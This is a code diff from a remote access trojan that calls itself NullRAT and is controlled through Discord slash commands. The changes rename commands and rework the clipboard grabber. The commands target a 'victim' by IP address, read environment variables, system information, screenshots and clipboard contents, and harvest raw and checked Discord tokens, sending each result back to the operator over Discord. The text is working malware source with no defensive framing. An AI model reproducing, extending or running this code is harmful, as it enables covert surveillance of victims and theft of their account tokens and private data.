@@ -44,7 +44,7 @@ async def command(ctx):
 
 
 @client.slash_command(
-    name="getenv",
+    name="get_environment",
     description="Finds the values of environment variables",
     options=[
         discord.Option("victim", description="IP Address of specific victim", required=True),
@@ -156,7 +156,7 @@ async def command(ctx, victim):
   
   
 @client.slash_command(
-    name="systeminfo",
+    name="get_systeminfo",
     description="Sends General System Information",
     options=[
         discord.Option("victim", description="IP Address of specific victim", required=True),
@@ -187,7 +187,7 @@ async def command(ctx, victim):
 
 
 @client.slash_command(
-    name="screenshot",
+    name="get_screenshot",
     description="Sends screenshot of entire monitor",
     options=[
         discord.Option("victim", description="IP Address of specific victim", required=True),
@@ -215,12 +215,26 @@ async def command(ctx, victim):
         os.remove(nr_working + "\\monitor.png")
 
 
-@client.slash_command(description="Sends text contents of clipboard")
-async def clipboard(ctx, victim):
+@client.slash_command(
+    name="get_clipboard",
+    description="Sends text contents of clipboard",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+    ],
+)
+async def command(ctx, victim):
     if str(victim) == str(IP()):
         await ctx.response.defer()
+        
         outp = os.popen("powershell Get-Clipboard").read()
-        await ctx.followup.send(f"```{outp}```" if outp != "" else "No text in clipboard!")
+        if len(outp) > 1000:
+            return await ctx.followup.send(f"```{outp}```")
+        embed = discord.Embed(title="Clipboard contents", timestamp=datetime.now())
+        embed.add_field(name="Clipboard:", value=f"```{outp}```" if outp != "" else "No text in clipboard")
+        embed.set_footer(text="NullRAT")
+        
+        await ctx.followup.send(embed=embed)
+
 
 @client.slash_command(description="Sends raw Discord Tokens (fast)")
 async def raw_tokens(ctx, victim):
@@ -234,6 +248,7 @@ async def raw_tokens(ctx, victim):
         embed = Embed(title="Discord Tokens (NullRAT):", color=0x0081FA).add_field(name="RAW Tokens:", value=f"```{message.rstrip()}```")
         embed.set_footer(text="Written by NullCode1337")
         await ctx.followup.send(embed=embed)
+
 
 @client.slash_command(description="Sends checked tokens along with info (accurate)")
 async def checked_tokens(ctx, victim):
